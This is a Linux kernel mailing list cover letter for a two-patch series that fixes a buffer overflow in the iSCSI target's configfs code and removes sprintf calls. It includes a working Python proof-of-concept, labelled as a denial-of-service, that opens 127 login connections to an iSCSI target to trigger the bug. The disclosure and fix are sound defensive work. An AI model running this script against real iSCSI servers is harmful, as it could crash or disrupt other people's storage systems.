Return-Path: <linux-scsi-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by smtp.lore.kernel.org (Postfix) with ESMTP id C3EBDC41513
	for <linux-scsi@archiver.kernel.org>; Sat, 22 Jul 2023 15:27:24 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S230078AbjGVP1Y (ORCPT <rfc822;linux-scsi@archiver.kernel.org>);
        Sat, 22 Jul 2023 11:27:24 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:46326 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229654AbjGVP1X (ORCPT
        <rfc822;linux-scsi@vger.kernel.org>); Sat, 22 Jul 2023 11:27:23 -0400
Received: from mta-04.yadro.com (mta-04.yadro.com [89.207.88.248])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 4FE2D270F;
        Sat, 22 Jul 2023 08:27:20 -0700 (PDT)
DKIM-Filter: OpenDKIM Filter v2.11.0 mta-04.yadro.com 7C4DFC0003
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yadro.com; s=mta-04;
        t=1690039637; bh=r+P4Msj+urZHOJbRhQnx0nELKaHWQweWHp9umH9G+To=;
        h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:From;
        b=ERZbfkCgFtgFDC5Hv4FgfJFB6zs/JNFZIUCz45MktxbcTk95EHCOd1N4syRzg+jsj
         Esyu8m9tsPvjSwXiTNTD7+EwNoMB8mlN9T4FJgwoe+ozOqBW+y416V4VCd3ndpEQSE
         yW1nr63yh4DCnFkKfpNcEEszXbxQRp3ygzK0IxDzmPLji0CTuFEz1ueQsHmvwSXPq2
         E6mzXXj8Avgv4dlIkabfN/ZnagJfiSCrFSleHB0Y2RMk0eBNsS+6uFX+6VuHSHqNSF
         5z2SgzGN6MhjfBuwY0qJYtEZ2A5npcrKFovPTo6wRDn4gYLpnWTnXhq7meiLiECE5c
         ZA8jwAHJWXdeg==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yadro.com; s=mta-03;
        t=1690039637; bh=r+P4Msj+urZHOJbRhQnx0nELKaHWQweWHp9umH9G+To=;
        h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:From;
        b=j58RcRs6C+EmJNE+zMGVVx3V5WNNFz0J4XzUqGIiV5cnGUwRRzzP+S3zkaAjtYWfh
         57ANYWpVwGOKF4OYajC0pXSs0Sbci4RbYU1xNs2bu80iUDR8b53f7bHtS0SnYD/0VC
         STMTkX57qA3cqHcPteRpcKE+CP62PseG55ut2D1D6bmVP0zOwN3to8PjONsK29BXT5
         bMLfOM6+Wlyc5+nrUUlekt0sIp6JszgHwvWYlOkTWGVUJK873OC6CGGzp2cRe2RCaZ
         Xl/OtI1nxcrbQEUmDM2QRAus5W1WWMMyVms+RT8iNExbaY8YMttdyZ4jYxkx9bRVXu
         CmRh/kP7btHDA==
From:   Konstantin Shelekhin <k.shelekhin@yadro.com>
To:     Martin Petersen <martin.petersen@oracle.com>
CC:     <target-devel@vger.kernel.org>, <linux-scsi@vger.kernel.org>,
        <linux@yadro.com>, Konstantin Shelekhin <k.shelekhin@yadro.com>
Subject: [PATCH 0/2] scsi: target: iscsi: Get rid of sprintf in iscsi_target_configfs.c
Date:   Sat, 22 Jul 2023 18:26:36 +0300
Message-ID: <20230722152657.168859-1-k.shelekhin@yadro.com>
X-Mailer: git-send-email 2.41.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Content-Type: text/plain
X-ClientProxiedBy: T-EXCH-09.corp.yadro.com (172.17.11.59) To
 T-EXCH-09.corp.yadro.com (172.17.11.59)
Precedence: bulk
List-ID: <linux-scsi.vger.kernel.org>
X-Mailing-List: linux-scsi@vger.kernel.org

This patch series cleanses iscsi_target_configfs.c of sprintf usage. The
first patch fixes the real problem, the second just makes sure we are on
the safe side from now on.

I've reproduced the issue fixed in the first patch by utilizing this
cool thing:

  https://git.sr.ht/~kshelekhin/scapy-iscsi

Yeah, shameless promoting of my own tools, but I like the simplicity of
scapy and writing tests in C with libiscsi can be a little cumbersome.

Check it out:

  #!/usr/bin/env python3
  # Let's cause some DoS in iSCSI target

  import sys

  from scapy.supersocket import StreamSocket
  from scapy_iscsi.iscsi import *

  cpr = {
      "InitiatorName": "iqn.2016-04.com.open-iscsi:e476cd9e4e59",
      "TargetName": "iqn.2023-07.com.example:target",
      "HeaderDigest": "None",
      "DataDigest": "None",
  }

  spr = {
      "SessionType": "Normal",
      "ErrorRecoveryLevel": 0,
      "DefaultTime2Retain": 0,
      "DefaultTime2Wait": 2,
      "ImmediateData": "Yes",
      "FirstBurstLength": 65536,
      "MaxBurstLength": 262144,
      "MaxRecvDataSegmentLength": 262144,
      "MaxOutstandingR2T": 1,
  }

  if len(sys.argv) != 3:
      print("usage: dos.py <host> <port>", file=sys.stderr)
      exit(1)

  host = sys.argv[1]
  port = int(sys.argv[2])
  isid = 0xB00B
  tsih = 0
  connections = []

  for i in range(0, 127):
      s = socket.socket()
      s.connect((host, port))
      s = StreamSocket(s, ISCSI)

      ds = cpr if i > 0 else cpr | spr
      lirq = ISCSI() / LoginRequest(isid=isid, tsih=tsih, cid=i, ds=kv2text(ds))
      lirs = s.sr1(lirq)
      tsih = lirs.tsih

      connections.append(s)

  input()

Konstantin Shelekhin (2):
  scsi: target: iscsi: Fix buffer overflow in lio_target_nacl_info_show
  scsi: target: iscsi: Stop using sprintf in iscsi_target_configfs.c

 drivers/target/iscsi/iscsi_target_configfs.c | 72 ++++++++++----------
 1 file changed, 36 insertions(+), 36 deletions(-)

-- 
2.41.0

